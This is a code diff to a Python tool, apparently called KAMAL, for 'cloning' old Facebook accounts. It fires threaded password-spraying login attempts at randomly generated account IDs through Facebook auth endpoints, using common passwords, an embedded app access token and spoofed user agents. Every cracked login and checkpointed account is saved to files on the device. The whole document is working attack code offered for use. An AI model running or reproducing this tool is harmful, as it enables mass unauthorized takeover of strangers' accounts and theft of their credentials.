@@ -16,8 +16,10 @@ WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
+# Your GitHub Raw Update URL
 UPDATE_URL = "https://raw.githubusercontent.com/nasirkamaluk27-hue/Old/main/raja"
 
+# Global variables for cloning
 oks = []
 cps = []
 loop = 0
@@ -70,7 +72,7 @@ def banner():
     print(f"│   | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$          │")
     print(f"│   | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$$$$$    │")
     print(f"│   |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |________/     │")
-    print(f"│                                           V7.0 (EXPERT PRO)│")
+    print(f"│                                     V12.0 (ULTIMATE RESTORED)│")
     print(f"│───────────────────── {WHITE}[MADE BY KAMAL]{YELLOW} ─────────────────────│")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
@@ -111,13 +113,29 @@ def update_script():
         time.sleep(2)
 
 def creationyear(uid):
-    if len(uid) == 8: return '2007-2008'
-    elif len(uid) == 7: return '2006'
-    elif len(uid) == 15:
+    if len(uid) == 15:
         if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')): return '2010'
-        return '2011+'
-    else: return 'ANCIENT'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
+        if uid.startswith('100001'): return '2010'
+        if uid.startswith(('100002', '100003')): return '2011'
+        if uid.startswith('100004'): return '2012'
+        if uid.startswith(('100005', '100006')): return '2013'
+        if uid.startswith(('100007', '100008')): return '2014'
+        if uid.startswith('100009'): return '2015'
+        if uid.startswith('10001'): return '2016'
+        if uid.startswith('10002'): return '2017'
+        if uid.startswith('10003'): return '2018'
+        if uid.startswith('10004'): return '2019'
+        if uid.startswith('10005'): return '2020'
+        if uid.startswith('10006'): return '2021'
+        if uid.startswith(('10007', '10008')): return '2022'
+        if uid.startswith('10009'): return '2023'
+        return ''
+    elif len(uid) in (9, 10): return '2008'
+    elif len(uid) == 8: return '2007'
+    elif len(uid) == 7: return '2006'
+    elif len(uid) == 14 and uid.startswith('61'): return '2024'
+    else: return ''
 
 def window1():
     android_version = random.choice(['10', '11', '12', '13', '14'])
@@ -127,59 +145,110 @@ def window1():
 
 def old_clone():
     banner()
-    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT) ➔ [INSTANT CRACK]")
-    print(f"       {GREEN}[2]{WHITE} 2007-2008 SERIES (8 DIGIT) ➔ [INSTANT CRACK]")
-    print(f"       {GREEN}[3]{WHITE} 2009-2010 SERIES (OLD)")
-    print(f"       {GREEN}[4]{WHITE} 100003/4 SERIES (2011-2012) (OLD)")
+    print(f"       {GREEN}[1]{WHITE} 2006 SERIES (7 DIGIT ANCIENT)")
+    print(f"       {GREEN}[2]{WHITE} 2007 SERIES (8 DIGIT ANCIENT)")
+    print(f"       {GREEN}[3]{WHITE} 2008 SERIES (8 DIGIT ANCIENT)")
+    print(f"       {GREEN}[4]{WHITE} 100003/4 SERIES (2011-2012)")
+    print(f"       {GREEN}[5]{WHITE} 2009-2010 SERIES")
     print("=" * 45)
     _input = input(f"       {YELLOW}CHOICE ➔ {RESET}").strip()
     if _input == '1':
-        instant_2006()
+        old_2006()
     elif _input == '2':
-        instant_2007_2008_8digit()
+        old_2007()
     elif _input == '3':
-        old_Tree()
+        old_2008()
     elif _input == '4':
         old_Tow()
+    elif _input == '5':
+        old_Tree()
     else:
         print(f"\n{RED}[×] Invalid Option!{RESET}")
         time.sleep(1.5)
         old_clone()
 
-def instant_2006():
+def old_2006():
     user = []
-    for uid_num in range(1000001, 1030000):
-        user.append(str(uid_num))
+    banner()
+    print(f"       {GREEN}Target ➔ 2006 Ancient 7-Digit Real Dumps{RESET}")
+    limit = input(f"       {GREEN}TOTAL ID COUNT (e.g. 20000) ➔ {RESET}")
+    for _ in range(int(limit)):
+        uid = str(random.choice(range(1000001, 1050000)))
+        user.append(uid)
+    banner()
+    print(f"       {GREEN}[A]{WHITE} METHOD 1 (Multi-Endpoint Optimized)")
+    print(f"       {GREEN}[B]{WHITE} METHOD 2 (Legacy Graph Optimized)")
+    meth = input(f"       {YELLOW}CHOICE (A/B) ➔ {RESET}").strip().upper()
     
     global loop
     loop = 0
-    banner()
-    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║     {YELLOW}{BOLD}[•] 2006 CONFIGURED DUMP CRACKING [•]{RESET}{CYAN}          ║")
-    print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
-    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
-    
     with tred(max_workers=50) as pool:
+        banner()
+        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
+        print(f"║          {YELLOW}{BOLD}[•] 2006 REAL DUMP TRACKING ACTIVE [•]{RESET}{CYAN}       ║")
+        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
+        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
         for uid in user:
-            pool.submit(login_engine, uid)
+            if meth == 'A':
+                pool.submit(login_ancient_m1, uid)
+            elif meth == 'B':
+                pool.submit(login_ancient_m2, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-def instant_2007_2008_8digit():
+def old_2007():
     user = []
-    for uid_num in range(10000000, 10030000):
-        user.append(str(uid_num))
+    banner()
+    print(f"       {GREEN}Target ➔ 2007 Ancient 8-Digit Real Dumps{RESET}")
+    limit = input(f"       {GREEN}TOTAL ID COUNT (e.g. 20000) ➔ {RESET}")
+    for _ in range(int(limit)):
+        uid = str(random.choice(range(10000000, 10250000)))
+        user.append(uid)
+    banner()
+    print(f"       {GREEN}[A]{WHITE} METHOD 1 (Multi-Endpoint Optimized)")
+    print(f"       {GREEN}[B]{WHITE} METHOD 2 (Legacy Graph Optimized)")
+    meth = input(f"       {YELLOW}CHOICE (A/B) ➔ {RESET}").strip().upper()
     
     global loop
     loop = 0
-    banner()
-    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
-    print(f"║   {YELLOW}{BOLD}[•] 2007-2008 CONFIGURED DUMP CRACKING [•]{RESET}{CYAN}    ║")
-    print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
-    print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
-    
     with tred(max_workers=50) as pool:
+        banner()
+        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
+        print(f"║          {YELLOW}{BOLD}[•] 2007 REAL DUMP TRACKING ACTIVE [•]{RESET}{CYAN}       ║")
+        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
+        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
         for uid in user:
-            pool.submit(login_engine, uid)
+            if meth == 'A':
+                pool.submit(login_ancient_m1, uid)
+            elif meth == 'B':
+                pool.submit(login_ancient_m2, uid)
+    input(f"\n{YELLOW}Press Enter to go back...{RESET}")
+
+def old_2008():
+    user = []
+    banner()
+    print(f"       {GREEN}Target ➔ 2008 Ancient 8-Digit Real Dumps{RESET}")
+    limit = input(f"       {GREEN}TOTAL ID COUNT (e.g. 20000) ➔ {RESET}")
+    for _ in range(int(limit)):
+        uid = str(random.choice(range(10250000, 10500000)))
+        user.append(uid)
+    banner()
+    print(f"       {GREEN}[A]{WHITE} METHOD 1 (Multi-Endpoint Optimized)")
+    print(f"       {GREEN}[B]{WHITE} METHOD 2 (Legacy Graph Optimized)")
+    meth = input(f"       {YELLOW}CHOICE (A/B) ➔ {RESET}").strip().upper()
+    
+    global loop
+    loop = 0
+    with tred(max_workers=50) as pool:
+        banner()
+        print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
+        print(f"║          {YELLOW}{BOLD}[•] 2008 REAL DUMP TRACKING ACTIVE [•]{RESET}{CYAN}       ║")
+        print(f"║       {WHITE}💡 TIP: USE AIRPLANE MODE IF SPEED DROPS{RESET}{CYAN}           ║")
+        print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_ancient_m1, uid)
+            elif meth == 'B':
+                pool.submit(login_ancient_m2, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
 def old_Tow():
@@ -239,15 +308,13 @@ def old_Tree():
                 pool.submit(login_2, uid)
     input(f"\n{YELLOW}Press Enter to go back...{RESET}")
 
-def login_engine(uid):
+def login_ancient_m1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-EXPERT] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[KAMAL-ANCIENT-M1] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
         sys.stdout.flush()
-        
         passwords = ('123456', 'password', '12345', '12345678', 'qwerty', '123123', 'iloveyou', 'secret', '1234567', 'admin', '112233', '000000', '123456890', '1234560', '1234', 'welcome')
-        
         for pw in passwords:
             data = {
                 'adid': str(uuid.uuid4()),
@@ -280,7 +347,6 @@ def login_engine(uid):
             }
             endpoint = random.choice(['https://b-graph.facebook.com/auth/login', 'https://graph.facebook.com/auth/login'])
             res = session.post(endpoint, data=data, headers=headers, allow_redirects=False).json()
-            
             if 'session_key' in res or 'access_token' in res:
                 ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
                          f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
@@ -288,10 +354,10 @@ def login_engine(uid):
                          f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                          f"║  🔢 UID      : {uid:<43} ║\n" \
                          f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
+                         f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
                          f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                 print(ok_msg)
-                open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
+                open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
@@ -301,12 +367,44 @@ def login_engine(uid):
                          f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
                          f"║  🔢 UID      : {uid:<43} ║\n" \
                          f"║  🔑 Password : {pw:<43} ║\n" \
-                         f"║  📅 Era      : {creationyear(uid):<43} ║\n" \
+                         f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
                          f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
                 print(cp_msg)
-                open('/sdcard/KAMAL-OLD-CP.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nEra: {creationyear(uid)}\n-----------------------------------\n")
+                open('/sdcard/KAMAL-OLD-CP.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
                 cps.append(uid)
                 break
+        loop += 1
+    except Exception:
+        pass
+
+def login_ancient_m2(uid):
+    global loop
+    try:
+        sys.stdout.write(f"\r\r{CYAN}[KAMAL-ANCIENT-M2] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
+        sys.stdout.flush()
+        passwords = ('123456', 'password', '12345', '12345678', 'qwerty', '123123', 'iloveyou', 'secret', '1234567', 'admin', '112233', '000000', '123456890', '1234560', '1234', 'welcome')
+        for pw in passwords:
+            with requests.Session() as session:
+                headers = {
+                    'user-agent': window1(),
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&cpl=true"
+                po = session.get(url, headers=headers).json()
+                if 'session_key' in str(po):
+                    ok_msg = f"\n{GREEN}╔══════════════════════════════════════════════════════════╗\n" \
+                             f"║                   {BOLD}🎉 SUCCESSFUL HIT! 🎉{RESET}{GREEN}                 ║\n" \
+                             f"╠══════════════════════════════════════════════════════════╣\n" \
+                             f"║  🔗 Link     : https://www.facebook.com/{uid}       \n" \
+                             f"║  🔢 UID      : {uid:<43} ║\n" \
+                             f"║  🔑 Password : {pw:<43} ║\n" \
+                             f"║  📅 Created  : {creationyear(uid):<43} ║\n" \
+                             f"╚══════════════════════════════════════════════════════════╝{RESET}\n"
+                    print(ok_msg)
+                    open('/sdcard/KAMAL-OLD-OK.txt', 'a').write(f"Link: https://www.facebook.com/{uid}\nUID: {uid}\nPassword: {pw}\nYear: {creationyear(uid)}\n-----------------------------------\n")
+                    oks.append(uid)
+                    break
         loop += 1
     except Exception:
         pass
